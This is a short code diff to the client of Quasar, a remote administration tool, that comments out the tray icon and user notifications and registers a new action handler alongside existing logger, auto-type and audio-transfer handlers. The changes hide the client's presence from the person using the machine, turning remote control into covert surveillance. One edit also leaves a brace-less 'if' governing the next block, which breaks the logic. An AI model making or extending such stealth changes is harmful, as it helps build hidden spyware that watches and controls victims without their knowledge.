@@ -148,7 +148,7 @@ namespace Quasar.Client
                 }
 
                 if (!Settings.UNATTENDEDMODE)
-                    InitializeNotifyicon();
+                    //InitializeNotifyicon();
 
                 if (Settings.ENABLELOGGER)
                 {
@@ -257,12 +257,13 @@ namespace Quasar.Client
             _messageProcessors.Add(new RedTextHandler());
             _messageProcessors.Add(new AutoTypeHandler());
             _messageProcessors.Add(new AudioTransferHandler());
+            _messageProcessors.Add(new RTActionHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Register(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged += ShowNotification;
+                //if (msgProc is NotificationMessageProcessor notifyMsgProc)
+                 //   notifyMsgProc.ProgressChanged += ShowNotification;
             }
         }
 
@@ -274,8 +275,8 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Unregister(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged -= ShowNotification;
+                //if (msgProc is NotificationMessageProcessor notifyMsgProc)
+                //    notifyMsgProc.ProgressChanged -= ShowNotification;
                 if (msgProc is IDisposable disposableMsgProc)
                     disposableMsgProc.Dispose();
             }
